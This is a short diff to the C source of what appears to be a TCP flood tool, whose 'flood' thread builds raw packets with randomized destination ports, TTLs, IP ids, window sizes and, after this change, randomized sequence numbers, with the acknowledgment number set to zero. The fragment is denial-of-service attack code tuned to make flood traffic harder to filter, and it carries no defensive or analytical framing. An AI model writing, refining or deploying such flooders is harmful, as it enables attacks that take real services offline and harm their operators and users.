@@ -190,7 +190,6 @@ void setup_tcp_header(struct tcphdr *tcph)
 	tcph->dest = htons(80);
 	tcph->source = htons(floodport);
 	tcph->ack = 0;
-	tcph->ack_seq = randnum(10000, 99999);
 	tcph->psh = 0;
 	tcph->fin = 0;
 	tcph->rst = 0;
@@ -201,6 +200,7 @@ void setup_tcp_header(struct tcphdr *tcph)
 	tcph->urg_ptr = 0;
 	tcph->window = 8192;
 	tcph->check = 0;
+	tcph->ack_seq = 0;
 }
 
 void setup_tcpopts_header(struct tcpOptions *opts)
@@ -297,7 +297,7 @@ void *flood(void *par1)
 		tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct tcpOptions)) / 4;
 		tcph->dest = htons(ports[randnum(0, sizeof_ports)]);
 		iph->id = htonl(rand_cmwc() & 0xFFFF);
-		tcph->ack_seq = randnum(10000, 99999);
+		tcph->seq = htonl(randnum(1000000, 9999999)); // Custom sequence number
 		iph->ttl = randnum(64, 255);
 		tcph->window = htons(windows[rand_cmwc() % 4]);
 		int congestion = randnum(0, 2);
